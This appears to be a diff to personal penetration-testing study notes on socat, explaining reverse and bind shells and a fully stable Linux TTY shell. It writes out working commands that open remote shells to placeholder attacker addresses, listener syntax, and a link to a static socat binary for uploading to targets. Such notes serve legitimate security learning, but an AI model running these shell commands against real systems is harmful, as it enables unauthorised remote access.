@@ -97,4 +97,51 @@ Next, in your reverse/bind shell, type in: `stty rows <number>`  and `stty cols 
 ## **Socat**
 Socat is similar to netcat in some ways, but fundamentally different in many others. The easiest way to think about socat is as a connector between two points. This will essentially be a listening port and a file, or indeed, two listening ports.
 
-**_Reverse Shells_**
+- **_Reverse Shells_**
+	Here's the syntax for a basic reverse shell listener in socat:  
+	`socat TCP-L:<port> -`
+
+On Windows we would use this command to connect back:
+`socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes`
+
+On a Linux target we would use the following command:
+`socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"`
+
+The "pipes" option is used to force powershell (or cmd.exe) to use Unix style standard input and output.
+
+- **_Bind Shells_**
+	We use this command on our attacking machine to connect to the waiting listener:
+	`socat TCP:<TARGET-IP>:<TARGET-PORT> -`
+
+On a Windows target we would use this command for our listener:
+`socat TCP-L:<PORT> EXEC:powershell.exe,pipes`
+
+On a Linux target we would use the following command:
+`socat TCP-L:<PORT> EXEC:"bash -li"`
+
+We use the "pipes" argument to interface between the Unix and Windows ways of handling input and output in a CLI environment.
+
+### Fully stable Linux tty reverse shell
+This will only work when the target is Linux, but is _significantly_ more stable. The following technique is perhaps one of its most useful applications. Here is the new listener syntax:
+
+`socat TCP-L:<port> FILE:`tty`,raw,echo=0`
+
+As usual, we're connecting two points together. In this case those points are a listening port, and a file. Specifically, we are passing in the current TTY as a file and setting the echo to be zero. This is approximately equivalent to using the Ctrl + Z, `stty raw -echo; fg` trick with a netcat shell -- with the added bonus of being immediately stable and hooking into a full tty.
+
+The first listener can be connected to with any payload; however, this special listener must be activated with a very specific socat command. This means that the target must have socat installed. Most machines do not have socat installed by default, however, it's possible to upload a [precompiled socat binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true), which can then be executed as normal. The special command is as follows:
+
+`socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li", pty, stderr, sigint, setsid, sane`
+
+The first part is easy -- we're linking up with the listener running on our own machine. The second part of the command creates an interactive bash session with  `EXEC:"bash -li"`. We're also passing the arguments: pty, stderr, sigint, setsid and sane:
+
+- **pty**, allocates a pseudoterminal on the target -- part of the stabilisation process
+- **stderr**, makes sure that any error messages get shown in the shell (often a problem with non-interactive shells)  
+- **sigint**, passes any Ctrl + C commands through into the sub-process, allowing us to kill commands inside the shell
+- **setsid**, creates the process in a new session
+- **sane**, stabilises the terminal, attempting to "normalise" it.
+
+![[Pasted image 20240817172839.png]]
+
+On the left we have a listener running on our local attacking machine, on the right we have a simulation of a compromised target, running with a non-interactive shell. Using the non-interactive netcat shell, we execute the special socat command, and receive a fully interactive bash shell on the socat listener to the left.
+
+## **Socat Encrypted Shells**
